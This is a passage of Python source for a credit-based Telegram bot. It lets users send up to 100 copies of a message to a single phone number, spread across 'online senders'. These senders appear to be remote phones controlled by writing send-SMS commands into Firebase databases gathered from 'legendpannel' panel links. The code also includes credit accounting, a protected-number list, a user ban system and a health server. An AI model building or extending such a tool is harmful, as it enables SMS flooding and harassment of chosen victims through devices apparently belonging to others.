        return used, int(store.get(key, 0))


USER_KB = {
    "inline_keyboard": [
        [{"text": "📩 Send message", "callback_data": "usend"}],
        [{"text": "📬 My messages", "callback_data": "umy"}],
        [{"text": "❓ Help", "callback_data": "uhelp"}],
    ]
}

MAX_QTY = 100  # user per-send message cap (quantity, not device slots)
CTAS_QTY = {"inline_keyboard": [
    [{"text": "10", "callback_data": "uqty:10"},
     {"text": "20", "callback_data": "uqty:20"},
     {"text": "50", "callback_data": "uqty:50"},
     {"text": "100", "callback_data": "uqty:100"}],
    [{"text": "❌ Cancel", "callback_data": "ucancel"}],
]}

USER_CANCEL_KB = {"inline_keyboard": [[{"text": "❌ Cancel", "callback_data": "ucancel"}]]}
USER_BACK_KB = {"inline_keyboard": [[{"text": "🔙 Menu", "callback_data": "u_back"}]]}


def is_admin(chat_id) -> bool:
    return str(chat_id) == ADMIN_CHAT_ID


def load_json(path: str, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if data is not None else default
    except Exception:
        return default


def save_json(path: str, obj) -> None:
    # crash-shield: a full/hosed disk must never kill the runtime thread
    try:
        tmp = path + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)
        os.replace(tmp, path)
        try:
            os.chmod(path, 0o600)
        except Exception:
            pass
    except Exception as exc:
        print("save_json failed:", path, exc)


def register_user(chat_id: int, frm: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    users = load_json(USER_STORE, {})
    key = str(chat_id)
    rec = users.get(key, {})
    if frm:
        if frm.get("first_name"):
            rec["first_name"] = frm.get("first_name")
        if frm.get("username"):
            rec["username"] = frm.get("username")
    rec.setdefault("joined", time.strftime("%Y-%m-%d %H:%M"))
    rec.setdefault("banned", False)
    rec.setdefault("sends", 0)
    users[key] = rec
    save_json(USER_STORE, users)
    return rec


def bump_user_sends(chat_id: int) -> None:
    users = load_json(USER_STORE, {})
    key = str(chat_id)
    rec = users.get(key, {})
    rec["sends"] = int(rec.get("sends", 0)) + 1
    users[key] = rec
    save_json(USER_STORE, users)


def log_send(rec: Dict[str, Any]) -> None:
    sends = load_json(SEND_STORE, [])
    sends.append(rec)
    save_json(SEND_STORE, sends[-500:])


def user_sends_list(chat_id: int, limit: int = 10) -> List[Dict[str, Any]]:
    sends = load_json(SEND_STORE, [])
    mine = [s for s in sends if str(s.get("user")) == str(chat_id)]
    return mine[-limit:]


def normalize_phone(value: str) -> Optional[str]:
    v = (value or "").strip()
    plus = v.startswith("+")
    digits = re.sub(r"\D", "", v)
    if not (7 <= len(digits) <= 15):
        return None
    return ("+" if plus else "") + digits


def user_menu_text() -> str:
    return (
        "<b>👋 Welcome to the SMS panel</b>\n"
        "Send a text message to any phone number.\n\n"
        "Tap <b>📩 Send message</b>, enter the recipient's number, "
        "type your message, confirm — done.\n"
        "Use <b>📬 My messages</b> to check delivery status."
    )


def user_help_text() -> str:
    return (
        "<b>❓ How to send</b>\n"
        "1. Tap 📩 Send message (or /send).\n"
        "2. Enter the recipient's number with country code, e.g. <code>+15551234567</code>.\n"
        "3. Type your message (max 1000 chars).\n"
        "4. Choose how many messages to send: 10 / 20 / 50 / 100 — or type any number up to 100. "
        "They are spread evenly across all online senders.\n"
        "5. Check the summary (number, message, quantity), pick SIM, tap ✅ Send.\n\n"
        "📬 My messages (or /my) shows your recent sends and whether the "
        "device picked them up yet.\n"
        "🪙 Sending uses credits: 1 credit = 3 sends. /credits shows your balance.\n"
        "One send per 30 seconds. /cancel aborts the current draft."
    )


def handle_user_command(chat_id: int, text: str):
    if not text or not text.strip():
        return
    cmd = text.strip().split()[0].lower()
    if cmd == "/start":
        USTATE.pop(chat_id, None)
        send(chat_id, user_menu_text(), USER_KB)
    elif cmd == "/send":
        USTATE[chat_id] = {"stage": "number"}
        send(chat_id, "📩 <b>New message</b>\n\nSend the recipient's number (with country code, e.g. <code>+15551234567</code>):", USER_CANCEL_KB)
    elif cmd == "/my":
        send(chat_id, "⏳ Checking statuses…", USER_KB)
        threading.Thread(target=lambda: user_my_render(chat_id, None), daemon=True).start()
    elif cmd == "/credits":
        bal = get_credits(chat_id)
        send(chat_id, f"🪙 <b>Credits</b>\nBalance: <b>{bal}</b> credit{'s' if bal != 1 else ''} — up to <b>{bal * SENDS_PER_CREDIT}</b> message sends.\n1 credit = {SENDS_PER_CREDIT} sends. Ask the admin for more.", USER_KB)
    elif cmd == "/cancel":
        USTATE.pop(chat_id, None)
        send(chat_id, "Draft cancelled.", USER_KB)
    elif cmd == "/help":
        send(chat_id, user_help_text(), USER_KB)
    else:
        send(chat_id, "Use /start to open the user panel.", USER_KB)


def handle_user_stage(chat_id: int, text: str):
    st = USTATE.get(chat_id)
    if not st:
        send(chat_id, "Use /start to open the user panel.", USER_KB)
        return
    if st.get("stage") == "number":
        to = normalize_phone(text)
        if not to:
            send(chat_id, "❌ That doesn't look like a phone number (7–15 digits).\nTry again, e.g. <code>+15551234567</code>:", USER_CANCEL_KB)
            return
        hit = prot_matches(to)
        if hit:
            send(chat_id, f"🛡 <b>Not allowed:</b> <code>{html.escape(hit)}</code> is protected by the admin. "
                          f"Messages to this number are blocked.\nTry another number:", USER_CANCEL_KB)
            return
        st.update(stage="text", to=to)
        send(chat_id, f"Recipient: <code>{html.escape(to)}</code>\n\nNow type your message (max {USER_MAX_TEXT} chars):", USER_CANCEL_KB)
    elif st.get("stage") == "text":
        t = (text or "").strip()
        if not t:
            send(chat_id, "Empty message — type the text to send:", USER_CANCEL_KB)
            return
        if len(t) > USER_MAX_TEXT:
            send(chat_id, f"Too long ({len(t)} chars). Keep it under {USER_MAX_TEXT}:", USER_CANCEL_KB)
            return
        st.update(stage="qty", text=t)
        send(chat_id,
             f"Recipient: <code>{html.escape(st['to'])}</code>\nMessage: {html.escape(t[:200])}{'…' if len(t) > 200 else ''}\n\n"
             "🧮 <b>How many messages should go out?</b>\n"
             "They will be spread across all online senders.\n"
             f"Tap a quantity, or type a number (1–{MAX_QTY}):",
             CTAS_QTY)
    elif st.get("stage") == "qty":
        q = "".join(ch for ch in (text or "") if ch.isdigit())
        if not q:
            send(chat_id, f"Enter a quantity, e.g. 10, 20, 50, 100 (1–{MAX_QTY}):", CTAS_QTY)
            return
        if int(q) > MAX_QTY:
            st["count"] = MAX_QTY
            send(chat_id, f"⚠️ Max {MAX_QTY} messages per send — using {MAX_QTY}.")
        else:
            st["count"] = max(1, int(q))
        st["stage"] = "confirm"
        threading.Thread(target=lambda: user_confirm_async(chat_id), daemon=True).start()
    else:
        send(chat_id, "Please use the buttons below to continue.", USER_KB)


def safe_online() -> List[Dict[str, Any]]:
    try:
        on = online_devices()
        if not on:
            # cold cache / partial timeout → one forced refresh before giving up
            on = [d for d in fetch_all_devices(force=True) if d.get("status")]
        return on
    except Exception:
        return []


def pool_cache_fresh() -> bool:
    """True if every pool DB has a fresh device cache → confirm can skip animation."""
    try:
        bases = pool_urls()
        if not bases:
            return False
        now = time.time()
        by = POOL_CACHE.get("by_base", {})
        for b in bases:
            e = by.get(b)
            if not e or e[1] is None or now - e[0] >= DEV_CACHE_TTL:
                return False
        return True
    except Exception:
        return False


def indeterminate_bar(i: int, width: int = 10) -> str:
    block, span = 3, width
    cyc = span * 2 - 2
    p = i % cyc
    pos = p if p < span else cyc - p
    pos = max(0, min(span - block, pos))
    return "░" * pos + "█" * block + "░" * (span - pos - block)


def confirm_async(chat_id: int, render, base: str = "Checking available devices") -> None:
    """Fast path (fresh cache → instant render, zero extra API calls) or animated
    placeholder (indeterminate bar + elapsed timer, 1.1s steps, max 12 frames)
    while fetching, then render by editing the placeholder in place."""
    if pool_cache_fresh():
        render(None, safe_online())
        return
    mid = send(chat_id, f"📡 <b>{base}…</b>\n<i>Connecting you, please wait.</i>", None)
    if not mid:
        render(None, safe_online())
        return
    box: Dict[str, Any] = {}
    worker = threading.Thread(target=lambda: box.update(online=safe_online()), daemon=True)
    worker.start()
    t0 = time.time()
    for i in range(12):
        worker.join(1.1)
        if not worker.is_alive():
            break
        try:
            api("editMessageText", {"chat_id": chat_id, "message_id": mid,
                                    "text": f"📡 <b>{base}</b> {indeterminate_bar(i)}\n<i>Connecting you… {int(time.time() - t0)}s</i>",
                                    "parse_mode": "HTML", "disable_web_page_preview": True})
        except Exception:
            pass
    worker.join()
    render(mid, box.get("online", []))


def user_confirm_async(chat_id: int) -> None:
    """Placeholder + spinner while the device fetch runs, then render confirm
    by editing the placeholder in place (bot never looks stuck)."""
    confirm_async(chat_id, lambda mid, online: user_confirm(chat_id, mid, _online=online))


def user_confirm(chat_id: int, message_id: Optional[int] = None, _online: Optional[List[Dict[str, Any]]] = None):
    def _fail(text: str, kb: Dict[str, Any]):
        if message_id is not None:
            edit(chat_id, message_id, text, kb)
        else:
            send(chat_id, text, kb)

    st = USTATE.get(chat_id)
    if not st or "to" not in st or "text" not in st:
        USTATE.pop(chat_id, None)
        _fail("Session expired. Start again with 📩 Send message.", USER_KB)
        return
    if not fb_base() and not pool_urls():
        _fail("⚠️ Sending is not configured yet. Please try later.", USER_KB)
        return
    online = _online if _online is not None else online_devices()
    if not online:
        _fail("⚠️ No senders are online right now. Try again later.", USER_KB)
        return
    sim = st.get("sim", 1)
    qty = max(1, min(MAX_QTY, int(st.get("count", 1))))
    st["count"] = qty
    preview = st["text"][:400] + ("…" if len(st["text"]) > 400 else "")
    bal = get_credits(chat_id)
    text = (
        "<b>✉️ Confirm send</b>\n"
        f"To: <code>{html.escape(st['to'])}</code>\n"
        f"Quantity: <b>{qty}</b> message{'s' if qty != 1 else ''} → spread over "
        f"<b>{len(online)}</b> online sender{'s' if len(online) != 1 else ''}\n\n"
        f"{html.escape(preview)}\n\n"
        f"🪙 Balance: <b>{bal}</b> credits ({bal * SENDS_PER_CREDIT} sends) · estimated use: {credit_tokens(qty)}\n"
        f"Pick a SIM slot, then:"
    )
    rows = [[{"text": f"{'✅ ' if sim == 1 else ''}SIM 1", "callback_data": "usim:1"},
             {"text": f"{'✅ ' if sim == 2 else ''}SIM 2", "callback_data": "usim:2"}],
            [{"text": "✅ Send now", "callback_data": "usendgo"}],
            [{"text": "❌ Cancel", "callback_data": "ucancel"}]]
    kb = {"inline_keyboard": rows}
    if message_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(chat_id, text, kb)


# (removed) user_do_send — superseded by run_bulk_send() (single or bulk,
# with live progress). Kept history/logging inside run_bulk_send.


def send_live_status(rec: Dict[str, Any]) -> str:
    try:
        node = fb_get_db(rec.get("db") or fb_base() or "", f"clients/{rec.get('device')}/webhookEvent/sendSms")
    except Exception:
        return "❔ unknown"
    if (isinstance(node, dict) and node.get("message") == rec.get("text")
            and str(node.get("to")) == str(rec.get("to"))):
        return "✅ sent by device" if node.get("isSended") else "⏳ queued — device hasn't picked it up"
    return "❔ superseded (device took a newer command)"


def user_my_render(chat_id: int, message_id: Optional[int] = None):
    mine = user_sends_list(chat_id)
    kb = {"inline_keyboard": [[{"text": "🔄 Refresh", "callback_data": "umy"}],
                              [{"text": "🔙 Menu", "callback_data": "u_back"}]]}
    if not mine:
        text = "📬 No messages yet. Tap 📩 Send message to send your first one."
        if message_id is not None:
            edit(chat_id, message_id, text, kb)
        else:
            send(chat_id, text, USER_KB)
        return
    lines = ["<b>📬 My messages</b> (latest first)", ""]
    for s in reversed(mine):
        st = send_live_status(s)
        ts = time.strftime("%d-%m %H:%M", time.localtime(int(s.get("ts", 0))))
        lines.append(f"{ts} → <code>{html.escape(str(s.get('to')))}</code> [{st}]\n  {html.escape(str(s.get('text', ''))[:80])}")
    text = "\n".join(lines)[:3500]
    if message_id is not None:
        edit(chat_id, message_id, text, kb)
    else:
        send(chat_id, text, kb)


def handle_user_callback(chat_id: int, message_id: int, data: str, callback_id: str):
    answer_callback(callback_id)
    if data == "u_back":
        USTATE.pop(chat_id, None)
        edit(chat_id, message_id, user_menu_text(), USER_KB)
    elif data == "uhelp":
        edit(chat_id, message_id, user_help_text(), USER_BACK_KB)
    elif data == "usend":
        USTATE[chat_id] = {"stage": "number"}
        send(chat_id, "📩 <b>New message</b>\n\nSend the recipient's number (with country code, e.g. <code>+15551234567</code>):", USER_CANCEL_KB)
    elif data == "ucancel":
        USTATE.pop(chat_id, None)
        edit(chat_id, message_id, "Draft cancelled.", USER_KB)
    elif data.startswith("uqty:"):
        st = USTATE.get(chat_id)
        if not st or "to" not in st or "text" not in st:
            edit(chat_id, message_id, "Session expired. Start again with 📩 Send message.", USER_KB)
            return
        try:
            q = int(data.split(":", 1)[1])
        except ValueError:
            return
        if q < 1 or q > MAX_QTY:
            answer_callback(callback_id, f"1–{MAX_QTY}")
            return
        answer_callback(callback_id, f"{q} messages selected")
        st["count"] = q
        st["stage"] = "confirm"
        user_confirm_async(chat_id)
    elif data.startswith("usim:"):
        st = USTATE.get(chat_id)
        if not st:
            edit(chat_id, message_id, "Session expired. Start again with 📩 Send message.", USER_KB)
            return
        st["sim"] = int(data.split(":", 1)[1])
        user_confirm(chat_id, message_id)
    elif data == "usendgo":
        st = USTATE.get(chat_id)
        if not st or "to" not in st or "text" not in st or "count" not in st:
            edit(chat_id, message_id, "Session expired. Start again with 📩 Send message.", USER_KB)
            return
        now = time.time()
        wait = USER_SEND_COOLDOWN - (now - ULAST_SEND.get(chat_id, 0))
        if wait > 0:
            answer_callback(callback_id, f"wait {int(wait)}s")
            send(chat_id, f"⏳ Slow down — one message per {USER_SEND_COOLDOWN}s. Try again in {int(wait)}s.", USER_KB)
            return
        hit = prot_matches(st.get("to", ""))
        if hit:
            USTATE.pop(chat_id, None)
            edit(chat_id, message_id, f"🛡 <b>Send cancelled:</b> <code>{html.escape(hit)}</code> is protected by the admin.", USER_KB)
            return
        to, txt, sim = st["to"], st["text"], st.get("sim", 1)
        qty = max(1, min(MAX_QTY, int(st.get("count", 1))))
        USTATE.pop(chat_id, None)
        online = online_devices()
        if not online:
            edit(chat_id, message_id, "⚠️ No senders online right now. Try again later.", USER_KB)
            return
        targets = [{"db": x["db"], "id": x["id"]} for x in online]
        capped = f"⚠️ Only {len(targets)} online — spread across all of them."
        # per-user send timeout: one live send per user; 4-min hard cap
        oldm = USER_ACTIVE.get(chat_id)
        if oldm:
            if time.time() - oldm["ts"] >= USER_SEND_TIMEOUT:
                oldm["ev"].set()  # abort the stuck send thread
                USER_ACTIVE.pop(chat_id, None)
            else:
                left = int(USER_SEND_TIMEOUT - (time.time() - oldm["ts"]))
                send(chat_id, f"⏳ <b>Your previous send is still running.</b>\n"
                              f"It times out in ~{left}s. Wait for it to finish.", USER_KB)
                return
        # credits: 1 credit = SENDS_PER_CREDIT sends (admin bypasses, pays nothing)
        if not is_admin(chat_id):
            bal = get_credits(chat_id)
            needed = credit_tokens(qty)
            if bal < needed:
                edit(chat_id, message_id,
                     f"🪙 <b>Not enough credits.</b>\nBalance: <b>{bal}</b> ({bal * SENDS_PER_CREDIT} sends) · "
                     f"needed: <b>{needed}</b> credit{'s' if needed != 1 else ''} for {qty} sends.\n"
                     f"Ask the admin for more credits, or try a smaller quantity.", USER_KB)
                return
        ULAST_SEND[chat_id] = now
        marker = {"ts": time.time(), "ev": threading.Event()}
        USER_ACTIVE[chat_id] = marker
        threading.Thread(target=lambda: run_qty_send(chat_id, message_id, to, txt, targets, sim, False, chat_id, capped, qty), daemon=True).start()
    elif data == "umy":
        edit(chat_id, message_id, "⏳ Checking statuses…", USER_KB)
        threading.Thread(target=lambda: user_my_render(chat_id, message_id), daemon=True).start()


def users_screen(chat_id: int, message_id: Optional[int] = None):
    """Admin: list registered bot users."""
    users = load_json(USER_STORE, {})
    credits = load_json(CREDITS_STORE, {})
    total = len(users)
    banned = sum(1 for r in users.values() if r.get("banned"))
    lines = ["<b>👥 Users</b>", f"Total: <b>{total}</b> | 🚫 banned: <b>{banned}</b>", ""]
    for uid, r in sorted(users.items()):
        name = html.escape(str(r.get("first_name") or "-"))
        uname = f" (@{html.escape(str(r.get('username')))})" if r.get("username") else ""
        flag = " 🚫" if r.get("banned") else ""
        lines.append(f"• {name}{uname} — <code>{uid}</code> · sends: {r.get('sends', 0)} · 🪙 {int(credits.get(uid, 0))}{flag}")
        if len(lines) > 27:
            lines.append(f"… +{total - 25} more")
            break
    lines += ["", "Commands: <code>/ban &lt;id&gt;</code> · <code>/unban &lt;id&gt;</code> · <code>/grant &lt;id&gt; &lt;±credits&gt;</code> · <code>/cast &lt;text&gt;</code>"]
    text = "\n".join(lines)[:3500]
    if message_id is not None:
        edit(chat_id, message_id, text, MAIN_KB)
    else:
        send(chat_id, text, MAIN_KB)


def admin_broadcast(chat_id: int, text: str):
    users = load_json(USER_STORE, {})
    targets = [int(uid) for uid, r in users.items() if not r.get("banned") and uid.isdigit()]
    if not targets:
        send(chat_id, "No users to broadcast to.", MAIN_KB)
        return
    ok = 0
    for uid in targets:
        try:
            send(uid, f"📢 <b>Announcement</b>\n\n{html.escape(text)}")
            ok += 1
        except Exception:
            pass
        time.sleep(0.05)
    send(chat_id, f"📢 Broadcast done: {ok}/{len(targets)} delivered.", MAIN_KB)


# -----------------------------------------------------------
# main loop
# -----------------------------------------------------------

def start_health_server() -> None:
    """Tiny HTTP server for Render/UptimeRobot (keeps free tier awake).
    Serves 200 {"ok": true} on /health (and /). Runs in a daemon thread."""
    from http.server import BaseHTTPRequestHandler, HTTPServer

    port = int(os.environ.get("PORT", "10000"))

    class H(BaseHTTPRequestHandler):
        def _ok(self):
            body = b'{"ok": true}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            self._ok()

        def do_HEAD(self):
            self._ok()

        def log_message(self, *a):
            pass

    try:
        srv = HTTPServer(("0.0.0.0", port), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        print(f"health server on :{port}")
    except Exception as exc:
        print("health server failed:", exc)


def seed_urls_from_env() -> None:
    """SEED_URLS env: space/comma/newline separated firebase URLs and/or
    legendpannel ?m=/?s= links. Merged into stored URLs on every boot so a
    fresh Render deploy (wiped disk) still knows its databases."""
    raw = os.environ.get("SEED_URLS", "")
    if not raw.strip():
        return
    urls = load_urls()
    added = []
    for part in re.split(r"[\s,]+", raw.strip()):
        if not part:
            continue
        targets = parse_input(part)
        if not targets and re.match(r"^https?://", part, re.I):
            targets = [part]
        for t in targets:
            t = t.rstrip("/")
            if t not in urls:
                urls.append(t)
                added.append(t)
    if added:
        save_urls(urls)
        print(f"seeded {len(added)} URL(s) from SEED_URLS")


def main():
    print("Bot started. Admin chat:", ADMIN_CHAT_ID)
    seed_urls_from_env()
    start_health_server()
    t = threading.Thread(target=watch_loop, daemon=True)
    t.start()
    offset: Optional[int] = None
    while True:
        try:
            updates = get_updates(offset)
            if not updates.get("ok"):
                time.sleep(2)
                continue
            for update in updates.get("result", []):
                try:
                    offset = update["update_id"] + 1

                    cb = update.get("callback_query")
                    if cb:
                        chat_id = cb["message"]["chat"]["id"]
                        if is_admin(chat_id):
                            handle_callback(chat_id, cb["message"]["message_id"], cb.get("data", ""), cb["id"])
                        else:
                            rec = register_user(chat_id, cb.get("from"))
                            if rec.get("banned"):
                                answer_callback(cb["id"], "blocked")
                            else:
                                handle_user_callback(chat_id, cb["message"]["message_id"], cb.get("data", ""), cb["id"])
                        continue

                    msg = update.get("message") or update.get("edited_message")
                    if not msg:
                        continue
                    chat_id = msg["chat"]["id"]
                    if is_admin(chat_id):
                        if chat_id in PENDING:
                            mode = PENDING.pop(chat_id)
                            if mode == "add":
                                add_url(chat_id, msg.get("text", ""))
                            elif mode == "remove":
                                remove_url(chat_id, msg.get("text", ""))
                            elif mode == "prot_add":
                                t = (msg.get("text") or "").strip()
                                if t.startswith("/"):
                                    handle_command(chat_id, t)  # /cancel, /protection… escape hatch
                                    continue
                                protect_add_result(chat_id, protect_add(t))
                                protection_screen(chat_id)
                            elif isinstance(mode, tuple) and mode[0] == "adm_num":
                                to = normalize_phone(msg.get("text", ""))
                                if not to:
                                    PENDING[chat_id] = mode
                                    send(chat_id, "❌ Invalid number (7–15 digits). Try again:", ADMIN_CANCEL_KB)
                                else:
                                    devdb = mode[2] if len(mode) > 2 else None
                                    PENDING[chat_id] = ("adm_text", mode[1], devdb, to)
                                    send(chat_id, f"To: <code>{html.escape(to)}</code>\n\nStep 2/2 — message text:", ADMIN_CANCEL_KB)
                            elif isinstance(mode, tuple) and mode[0] == "adm_text":
                                t = (msg.get("text") or "").strip()
                                if not t:
                                    PENDING[chat_id] = mode
                                    send(chat_id, "Empty message — type the text:", ADMIN_CANCEL_KB)
                                else:
                                    ADM_DRAFT[chat_id] = {"dev": mode[1], "devdb": mode[2], "to": mode[3], "text": t[:1000], "sim": 1, "mode": "single", "count": 1}
                                    threading.Thread(target=lambda: admin_confirm_async(chat_id), daemon=True).start()
                            continue

                        text = msg.get("text", "").strip()
                        if text.startswith("/"):
                            handle_command(chat_id, text)
                        elif text:
                            send(chat_id, "Use /start to open the admin panel.", MAIN_KB)
                        continue

                    rec = register_user(chat_id, msg.get("from"))
                    if rec.get("banned"):
                        send(chat_id, "🚫 You are blocked from using this bot.")
                        continue
                    text = (msg.get("text") or "").strip()
                    if text.startswith("/"):
                        handle_user_command(chat_id, text)
                    elif chat_id in USTATE:
                        handle_user_stage(chat_id, text)
                    elif text:
                        send(chat_id, "Use /start to open the user panel.", USER_KB)
                except Exception as exc:
                    # one malformed update must never kill its batch siblings
                    print("update error:", exc)
        except KeyboardInterrupt:
            print("\nStopped.")
            WATCH_STOP.set()
            break
        except Exception as exc:
            print("loop error:", exc)
            time.sleep(3)


if __name__ == "__main__":
    main()
